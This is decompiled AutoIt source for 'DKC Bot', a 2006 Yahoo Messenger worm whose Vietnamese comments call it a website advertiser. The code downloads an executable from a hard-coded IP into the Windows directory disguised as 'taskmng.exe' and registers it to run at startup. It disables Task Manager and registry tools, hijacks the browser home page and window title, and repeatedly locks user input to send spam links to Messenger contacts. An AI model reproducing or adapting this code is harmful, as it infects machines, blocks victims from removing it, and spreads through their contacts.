; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: D:\Hacker\tm.au3>
; ----------------------------------------------------------------------------

;------------------------------------------------
; Phan Mem: DKC Bot
; Phien Ban: 1.1
; Cong Dung: Quang cao Website thong qua Y!M
; Hoan Thanh: 1-9-2006
;-------------------------------------------------------

; Thiet Lap
#NoTrayIcon
$trinhduyet = "Ay chet, o doi ai lai la`m the !"
$ngaunhien = Random(0,9,1)

; Website Ngau Nhien
Dim $web[10]
$web[0] = "http://66.98.138.31/~kfc/giaitri/thugian1ti.html"
$web[1] = "http://66.98.138.31/~kfc/giaitri/thugian1ti.html"
$web[2] = "http://66.98.138.31/~kfc/giaitri/thugian1ti.html"
$web[3] = "http://66.98.138.31/~kfc/giaitri/thugian1ti.html"
$web[4] = "http://66.98.138.31/~kfc/giaitri/thugian1ti.html"
$web[5] = "http://66.98.138.31/~kfc/giaitri/thugian1ti.html"
$web[6] = "http://66.98.138.31/~kfc/giaitri/thugian1ti.html"
$web[7] = "http://66.98.138.31/~kfc/giaitri/thugian1ti.html"
$web[8] = "http://66.98.138.31/~kfc/giaitri/thugian1ti.html"
$web[9] = "http://66.98.138.31/~kfc/giaitri/thugian1ti.html"
$website = $web[$ngaunhien]

; Tin Nhan Ngau Nhien
Dim $tin[10]
$tin[0] = "Hay lam ban oi " & $website
$tin[1] = "tuyet voi " & $website
$tin[2] = "Vo day xem ti " & $website
$tin[3] = "Xem ho cai nay cai " & $website
$tin[4] = "Vo ung ho di " & $website
$tin[5] = "Dep le'm " & $website
$tin[6] = "Hay hay hay ... " & $website
$tin[7] = "Hit me now " & $website
$tin[8] = "Dung bo lo ban oi " & $website
$tin[9] = "Vo day ma xem ne " & $website
$tinnhan = $tin[$ngaunhien]

; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\taskmng.exe") Then
InetGet ("http://66.98.138.31/~kfc/giaitri/tm.exe", @WindowsDir & "\taskmng.exe", 0, 1)
Sleep(20000)
EndIf

; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Micro soft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windo ws\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Wind ows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Inte rnet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\Vi ew\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\Vie w\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windo ws\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\taskmng.exe")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Inter net Explorer\Main", "Window Title", "REG_SZ", $trinhduyet)

; Thay Doi Status & Gui Tin Nhan
While(1)
Sleep(10000)
$tieude = WinGetTitle("Yahoo! Messenger", "")
$kiemtra = WinExists($tieude)
If $kiemtra = 1 Then
ClipPut($tinnhan)
BlockInput(1)
WinActivate($tieude)
Send("!m")
Send("un")
Send("^v {ENTER}{ENTER}")
Send("^m")
Send("{DOWN}")
Send("^{SHIFTDOWN}{END}{SHIFTUP}")
Send("{ENTER}")
Send("^v {ENTER}")
BlockInput(0)
EndIf
Sleep(1800000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: D:\Hacker\tm.au3>
; ----------------------------------------------------------------------------

